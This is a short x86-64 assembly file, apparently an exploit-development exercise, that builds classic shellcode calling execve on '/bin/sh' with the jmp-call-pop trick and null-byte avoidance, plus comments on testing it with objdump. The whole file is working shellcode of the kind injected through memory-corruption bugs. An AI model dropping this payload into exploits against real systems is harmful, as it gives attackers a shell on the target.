.global main

.text     # needs to be writable and executable for testing
#this will fail with .text, but objdump doesn't disassemble .data
#use .data to test .text to disassemble
#.data
main: 

jmp get_address        # get the address of our string

shellcode: 

pop %rdi #put shell in %rdi
# execve(char *filename, char *argv[], char *envp[])

xorq %rax,%rax
movb %al, 7(%rdi)
addq $59,%rax          # 59 = execve
xorq %rsi,%rsi         # char *argv[] = null
xorq %rdx,%rdx         # char *envp[] = null
syscall

get_address: 
call shellcode               # push the address of the string onto the stack

message: 
.ascii "/bin/shN"

